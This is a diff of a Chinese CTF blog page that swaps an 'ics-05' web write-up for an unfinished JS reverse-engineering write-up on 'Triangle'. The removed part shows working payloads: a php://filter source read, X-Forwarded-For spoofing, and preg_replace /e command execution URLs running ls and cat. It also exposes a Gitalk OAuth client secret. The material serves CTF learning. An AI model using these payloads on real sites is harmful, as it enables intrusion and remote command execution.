@@ -59,31 +59,22 @@
 </script>
 
 
-  <meta name="description" content="0x01 前要  1.php内置封装协议 filter2.伪造IP3.preg_replace()函数的&#x2F;e漏洞4.正确的php system()函数的书写">
+  <meta name="description" content="0x01 前要与心得 1.JS逆向 2.代码审计  感觉全篇坐下来，基本就是一道纯JS逆向题，不知道为什么分类到web里。">
 <meta property="og:type" content="article">
-<meta property="og:title" content="CTF攻防世界-WEB-cis05">
-<meta property="og:url" content="http://yoursite.com/2019/12/24/ctf-ics-05/index.html">
+<meta property="og:title" content="CTF攻防世界-WEB-Triangle">
+<meta property="og:url" content="http://yoursite.com/2020/01/01/ctf-web-Triangle/index.html">
 <meta property="og:site_name" content="MR-eggegg">
-<meta property="og:description" content="0x01 前要  1.php内置封装协议 filter2.伪造IP3.preg_replace()函数的&#x2F;e漏洞4.正确的php system()函数的书写">
+<meta property="og:description" content="0x01 前要与心得 1.JS逆向 2.代码审计  感觉全篇坐下来，基本就是一道纯JS逆向题，不知道为什么分类到web里。">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://yoursite.com/2019/12/24/ctf-ics-05/1.png">
-<meta property="og:image" content="http://yoursite.com/2019/12/24/ctf-ics-05/2.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/12/24/ctf-ics-05/3.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/12/24/ctf-ics-05/4.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/12/24/ctf-ics-05/5.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/12/24/ctf-ics-05/6.PNG">
-<meta property="og:image" content="http://yoursite.com/2019/12/24/ctf-ics-05/7.PNG">
-<meta property="article:published_time" content="2019-12-23T15:30:33.000Z">
-<meta property="article:modified_time" content="2019-12-27T02:00:38.755Z">
+<meta property="og:image" content="http://yoursite.com/2020/01/01/ctf-web-Triangle/1.PNG">
+<meta property="article:published_time" content="2020-01-01T13:32:58.000Z">
+<meta property="article:modified_time" content="2020-01-02T03:32:56.964Z">
 <meta property="article:author" content="egg">
-<meta property="article:tag" content="php内置filter协议">
-<meta property="article:tag" content="伪造IP">
-<meta property="article:tag" content="preg_replace()函数的&#x2F;e漏洞">
-<meta property="article:tag" content="正确的php system()函数的书写">
+<meta property="article:tag" content="JS逆向">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="http://yoursite.com/2019/12/24/ctf-ics-05/1.png">
+<meta name="twitter:image" content="http://yoursite.com/2020/01/01/ctf-web-Triangle/1.PNG">
 
-<link rel="canonical" href="http://yoursite.com/2019/12/24/ctf-ics-05/">
+<link rel="canonical" href="http://yoursite.com/2020/01/01/ctf-web-Triangle/">
 
 
 <script id="page-configurations">
@@ -95,7 +86,7 @@
   };
 </script>
 
-  <title>CTF攻防世界-WEB-cis05 | MR-eggegg</title>
+  <title>CTF攻防世界-WEB-Triangle | MR-eggegg</title>
   
 
 
@@ -230,7 +221,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/24/ctf-ics-05/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/01/ctf-web-Triangle/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.gif">
@@ -243,7 +234,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          CTF攻防世界-WEB-cis05
+          CTF攻防世界-WEB-Triangle
         </h1>
 
         <div class="post-meta">
@@ -253,14 +244,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2019-12-24 00:30:33" itemprop="dateCreated datePublished" datetime="2019-12-24T00:30:33+09:00">2019-12-24</time>
+              <time title="创建时间：2020-01-01 22:32:58" itemprop="dateCreated datePublished" datetime="2020-01-01T22:32:58+09:00">2020-01-01</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2019-12-27 11:00:38" itemprop="dateModified" datetime="2019-12-27T11:00:38+09:00">2019-12-27</time>
+                <time title="修改时间：2020-01-02 12:32:56" itemprop="dateModified" datetime="2020-01-02T12:32:56+09:00">2020-01-02</time>
               </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
@@ -285,74 +276,29 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <div class="note info"><p>0x01 前要</p></div>
+        <div class="note info"><p>0x01 前要与心得</p></div>
+1.JS逆向
+2.代码审计
 
-<p>1.<a href="https://www.cnblogs.com/likai/archive/2010/01/29/1659336.html" target="_blank">php内置封装协议 filter</a><br>2.伪造IP<br>3.preg_replace()函数的/e漏洞<br>4.正确的php system()函数的书写</p>
- <a id="more"></a>
+<p>感觉全篇坐下来，基本就是一道纯JS逆向题，不知道为什么分类到web里。</p>
+<a id="more"></a>
 
+</br>
 
 <div class="note info"><p>0x02 解题流程与思路</p></div>
-1.打开题目网页点击尝试，发现只有维护中心可以点击
+1.打开网页就有一个login按钮，尝试了下注入，发现好像没有注入点，扫描网页目录也没有什么收获。查看源码，找到login函数和3个JS文件。
 
-<p><img src="1.png" alt=""></p>
-<br>
+<p><img src="1.PNG" alt=""></p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">login</span></span>()&#123;</span><br><span class="line">	var input = document.getElementById(<span class="string">'password'</span>).value;</span><br><span class="line">	var enc = enc_pw(input);</span><br><span class="line">	var pw = get_pw();</span><br><span class="line">	<span class="keyword">if</span>(test_pw(enc, pw) == 1)&#123;</span><br><span class="line">		alert(<span class="string">'Well done!'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		alert(<span class="string">'Try again ...'</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+<p>2.根据源码，我们能找到3变量o1,o2,o3。同时找到3个JS文件，稍微查了一下，发现Unicorn.js是用JS实现的开源cpu模拟器。<br>还原JS代码：</p>
+<details>
+<summary>secret.js:     展开/折叠</summary>
 
-<ol start="2">
-<li>F12查看源代码，可以看到代码段?page=index，同时网页表现为 xxxx/index.php，此时可以猜测题目可能为文件包含读取网页的漏洞。利用php内置filter协议协助网页传参，查看结果。</li>
-</ol>
-<br>
-2_1.
- <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;li class=<span class="string">"layui-nav-item layui-this"</span>&gt;&lt;a href=<span class="string">"?page=index"</span>&gt;云平台设备维护中心&lt;/a&gt;&lt;/li&gt;</span><br></pre></td></tr></table></figure></div>
-2_2.为了能够正常读取到内置文件的内容，所以采用base64模式提前将php内置文件源码我们所需的部分转化为base64形式，取得代码后在线转码即可获得源码。
- <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?page=php://filter/<span class="built_in">read</span>=convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure></div>
-
-<p><img src="2.PNG" alt=""></p>
-<br>
-
-<p>3.转码获得源码</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="variable">$_SERVER</span>[<span class="string">'HTTP_X_FORWARDED_FOR'</span>] === <span class="string">'127.0.0.1'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">echo</span> <span class="string">"&lt;br &gt;Welcome My Admin ! &lt;br &gt;"</span>;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$pattern</span> = <span class="variable">$_GET</span>[pat];</span><br><span class="line">    <span class="variable">$replacement</span> = <span class="variable">$_GET</span>[rep];</span><br><span class="line">    <span class="variable">$subject</span> = <span class="variable">$_GET</span>[sub];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (isset(<span class="variable">$pattern</span>) &amp;&amp; isset(<span class="variable">$replacement</span>) &amp;&amp; isset(<span class="variable">$subject</span>)) &#123;</span><br><span class="line">        preg_replace(<span class="variable">$pattern</span>, <span class="variable">$replacement</span>, <span class="variable">$subject</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        die();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
-<p>3_1.代码审计<br>（1）我们需要从127.0.0.1 IP地址登陆，使用Burp Suite伪造html头IP<br>（1_1）可以看到我们登陆成功<br><img src="3.PNG" alt=""></p>
-<p>（2）<a href="https://blog.csdn.net/ww122081351/article/details/17579851" target="_blank">preg_replace危险的/e修饰符</a><br>    简单的说明一下preg_replace（）函数，详细的说明以及示例可以点击超链接，阅读另一位博主的详细说明</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">preg_replace (<span class="variable">$pattern</span> , <span class="variable">$replacement</span> ,  <span class="variable">$subject</span> [, int <span class="variable">$limit</span> = -1 [, int &amp;<span class="variable">$count</span> ]] )</span><br><span class="line"><span class="variable">$pattern</span>:       搜索的模式，可以是字符串或一个字符串数组。</span><br><span class="line"><span class="variable">$replacement</span>:   用于替换的字符串或字符串数组。</span><br><span class="line"><span class="variable">$subject</span>:       要搜索替换的目标字符串或字符串数组。</span><br><span class="line">关于/e：</span><br><span class="line"> 当pattern中有/e是代表preg_replace()函数的/e时，subject中匹配到的pattern会将replacement当作代码执行。</span><br><span class="line"> 潜在威胁： 当replacement为可控时，可以直接编写一句话木马</span><br></pre></td></tr></table></figure></div>
-<p>（2_2）利用漏洞寻找flag<br>    %20代表空格，%26%26就是&amp;&amp;代表当前面命令执行成功时，继续执行后面的命令</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
-<p><img src="4.PNG" alt=""></p>
-<p>(2_3)根据文件目录，查看可疑文件layui和s3chahahaDir，通过cd到文件夹，查看文件内容，最终确认为s3chahahaDir文件夹</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
-<p><img src="5.PNG" alt=""><br>（2_4）找到flag文件夹后，继续cd，寻找所需的flag</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cd%20s3chahahaDir/flag%26%26%20ls"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
-<p><img src="6.PNG" alt=""><br>(2_5)确认flag所在的文件，直接抓取内容</p>
-<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/index.php?pat=/<span class="built_in">test</span>/e&amp;rep=system(<span class="string">"cat%20s3chahahaDir/flag/flag.php"</span>)&amp;sub=haha%20test</span><br></pre></td></tr></table></figure></div>
-<p><img src="7.PNG" alt=""><br>成功找到flag</p>
-<div class="note info"><p>0x03 解题过程中存在的问题</p></div>
-1.Burp Suite存在复制黏贴产生报错结果，建议可以手打重新尝试
-
-
-
-<div class="note info"><p>0x04 参考</p></div>
-1.<a href="https://blog.csdn.net/zhwho/article/details/100694073" target="_blank">攻防世界web进阶ics-05 wp</a><br>
-2.<a href="https://blog.csdn.net/ww122081351/article/details/17579851" target="_blank">preg_replace危险的/e修饰符</a><br>
-3.<a href="https://blog.csdn.net/About23/article/details/95349625" target="_blank">攻防世界ics-5wp</a><br>
-
-
-
-<!-- Link Gitalk 的支持文件  -->
-<link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
-<script src="https://unpkg.com/gitalk@latest/dist/gitalk.min.js"></script> 
-<div id="gitalk-container"></div>     <script type="text/javascript">
-    var gitalk = new Gitalk({
-
-<pre><code>// gitalk的主要参数
-    clientID: &apos;dcf239aa6b46fcf244a3&apos;,
-    clientSecret: &apos;2b92cc0f958358e2c10b5fb8746381c15f5ee29d&apos;,
-    repo: &apos;MR-eggegg.github.io&apos;,
-    owner: &apos;MR-eggegg&apos;,
-    admin: [&apos;MR-eggegg&apos;],
-    id: &apos;页面的唯一标识，gitalk会根据这个标识自动创建的issue的标签&apos;,
-
-});
-gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
-
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line">function test_pw(e,_)&#123;</span><br><span class="line">	var t&#x3D;stoh(atob(getBase64Image(&quot;eye&quot;))),</span><br><span class="line">	r&#x3D;4096,</span><br><span class="line">	m&#x3D;8192,</span><br><span class="line">	R&#x3D;12288,</span><br><span class="line">	a&#x3D;new uc.Unicorn(uc.ARCH_ARM,uc.MODE_ARM);</span><br><span class="line">	a.reg_write_i32(uc.ARM_REG_R9,m),</span><br><span class="line">	a.reg_write_i32(uc.ARM_REG_R10,R),</span><br><span class="line">	a.reg_write_i32(uc.ARM_REG_R8,_.length),</span><br><span class="line">	a.mem_map(r,4096,uc.PROT_ALL);</span><br><span class="line">	</span><br><span class="line">	for(var o&#x3D;0;o&lt;o1.length;o++)</span><br><span class="line">		a.mem_write(r+o,[t[o1[o]]]);</span><br><span class="line">	a.mem_map(m,4096,uc.PROT_ALL),</span><br><span class="line">	a.mem_write(m,stoh(_)),</span><br><span class="line">	a.mem_map(R,4096,uc.PROT_ALL),</span><br><span class="line">	a.mem_write(R,stoh(e));</span><br><span class="line">	</span><br><span class="line">	var u&#x3D;r,</span><br><span class="line">	c&#x3D;r+o1.length;</span><br><span class="line">	</span><br><span class="line">	return a.emu_start(u,c,0,0),</span><br><span class="line">	a.reg_read_i32(uc.ARM_REG_R5)</span><br><span class="line">&#125;</span><br><span class="line">	</span><br><span class="line">function enc_pw(e)</span><br><span class="line">&#123;</span><br><span class="line">	var _&#x3D;stoh(atob(getBase64Image(&quot;frei&quot;))),</span><br><span class="line">	t&#x3D;4096,</span><br><span class="line">	r&#x3D;8192,</span><br><span class="line">	m&#x3D;12288,</span><br><span class="line">	R&#x3D;new uc.Unicorn(uc.ARCH_ARM,uc.MODE_ARM);     &#x2F;&#x2F;创建ARM加密</span><br><span class="line">	</span><br><span class="line">	R.reg_write_i32(uc.ARM_REG_R8,r),</span><br><span class="line">	R.reg_write_i32(uc.ARM_REG_R9,m),</span><br><span class="line">	R.reg_write_i32(uc.ARM_REG_R10,e.length),</span><br><span class="line">	R.mem_map(t,4096,uc.PROT_ALL);</span><br><span class="line">	</span><br><span class="line">	for(var a&#x3D;0;a&lt;o2.length;a++)</span><br><span class="line">		R.mem_write(t+a,[_[o2[a]]]);</span><br><span class="line"></span><br><span class="line">	R.mem_map(r,4096,uc.PROT_ALL),        &#x2F;&#x2F;写入寄存器</span><br><span class="line">	R.mem_write(r,stoh(e)),</span><br><span class="line">	R.mem_map(m,4096,uc.PROT_ALL);</span><br><span class="line">	</span><br><span class="line">	var o&#x3D;t,u&#x3D;t+o2.length;</span><br><span class="line">	</span><br><span class="line">	return R.emu_start(o,u,0,0),htos(R.mem_read(m,e.length))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function get_pw()&#123;</span><br><span class="line">	for(var e&#x3D;stoh(atob(getBase64Image(&quot;templar&quot;))),_&#x3D;&quot;&quot;,t&#x3D;0;t&lt;o3.length;t++)</span><br><span class="line">	</span><br><span class="line">	_+&#x3D;String.fromCharCode(e[o3[t]]);</span><br><span class="line">	return _&#125;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;details&gt;</span><br><span class="line"></span><br><span class="line">&lt;details&gt;</span><br><span class="line">&lt;summary&gt;util.js:     展开&#x2F;折叠&lt;&#x2F;summary&gt;</span><br></pre></td></tr></table></figure></div>
+<p>function stoh(t){<br>    return t.split(“”).map(function(t){<br>        return t.charCodeAt(0)<br>        })<br>}<br>function htos(t){<br>    return String.fromCharCode.apply(String,t)<br>}</p>
+<p>function getBase64Image(t){<br>    var e=document.getElementById(t),<br>    a=document.createElement(“canvas”);<br>    a.width=e.width,<br>    a.height=e.height;<br>    var n=a.getContext(“2d”);<br>    n.drawImage(e,0,0);<br>    var r=a.toDataURL(“image/png”);<br>    return r.replace(/^data:image/(png|jpeg);base64,/,””)<br>}</p>
+<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;&#x2F;details&gt;</span><br><span class="line"></span><br><span class="line">3.观察源代码，login函数中同时出现了3个函数：enc_pw(),get_pw(),test_pw()。&lt;&#x2F;br&gt;</span><br><span class="line">并且当 test_pw(enc_pw(document.getElementById(&#39;password&#39;).value) , get_pw()) &#x3D;&#x3D; 1 时，可以获得flag。</span><br><span class="line"></span><br><span class="line">4.在secret.js里找到enc_pw(),get_pw(),test_pw()三个函数，分别看他们产生的作用。</span><br><span class="line">	4_1.enc_pw():</span><br><span class="line">	(1)利用Unicorn.js创建的模拟cpu实现ARM架构的加密</span><br><span class="line">	(2)根据代码将数值循环加密，将 o2数组内的内容加密后写入内存(保存为 _[o2[a]])</span><br><span class="line">	&#96;&#96;&#96;bash</span><br><span class="line">	for(var a&#x3D;0;a&lt;o2.length;a++)R.mem_write(t+a,[_[o2[a]]]);</span><br></pre></td></tr></table></figure></div>
+<pre><code>(3)</code></pre>
     </div>
 
     
@@ -361,10 +307,7 @@ gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
 
       <footer class="post-footer">
           <div class="post-tags">
-              <a href="/tags/php%E5%86%85%E7%BD%AEfilter%E5%8D%8F%E8%AE%AE/" rel="tag"># php内置filter协议</a>
-              <a href="/tags/%E4%BC%AA%E9%80%A0IP/" rel="tag"># 伪造IP</a>
-              <a href="/tags/preg-replace-%E5%87%BD%E6%95%B0%E7%9A%84-e%E6%BC%8F%E6%B4%9E/" rel="tag"># preg_replace()函数的/e漏洞</a>
-              <a href="/tags/%E6%AD%A3%E7%A1%AE%E7%9A%84php-system-%E5%87%BD%E6%95%B0%E7%9A%84%E4%B9%A6%E5%86%99/" rel="tag"># 正确的php system()函数的书写</a>
+              <a href="/tags/JS%E9%80%86%E5%90%91/" rel="tag"># JS逆向</a>
           </div>
 
         
@@ -373,13 +316,10 @@ gitalk.render(&apos;gitalk-container&apos;);</code></pre><p></script></p>
         
     <div class="post-nav">
       <div class="post-nav-item">
-    <a href="/2019/12/24/pb%E5%9F%BA%E7%A1%80/" rel="prev" title="CTF攻防世界-WEB-cookie基础题">
-      <i class="fa fa-chevron-left"></i> CTF攻防世界-WEB-cookie基础题
+    <a href="/2019/12/31/ctf-web-php2/" rel="prev" title="CTF攻防世界-WEB-php2">
+      <i class="fa fa-chevron-left"></i> CTF攻防世界-WEB-php2
     </a></div>
-      <div class="post-nav-item">
-    <a href="/2019/12/27/ctf-lottery/" rel="next" title="CTF攻防世界-WEB-lottery">
-      CTF攻防世界-WEB-lottery <i class="fa fa-chevron-right"></i>
-    </a></div>
+      <div class="post-nav-item"></div>
     </div>
       </footer>
     
@@ -596,7 +536,7 @@ NexT.utils.loadComments(document.querySelector('#gitalk-container'), () => {
       repo: 'MR-eggegg.github.io',
       owner: 'MR-eggegg',
       admin: ['MR-eggegg'],
-      id: '3198c98a37ee0c36cd5088203ea9251e',
+      id: 'f7d8cf6c06a8503f6617a36dda08f469',
         language: '',
       distractionFreeMode: 'true'
     });
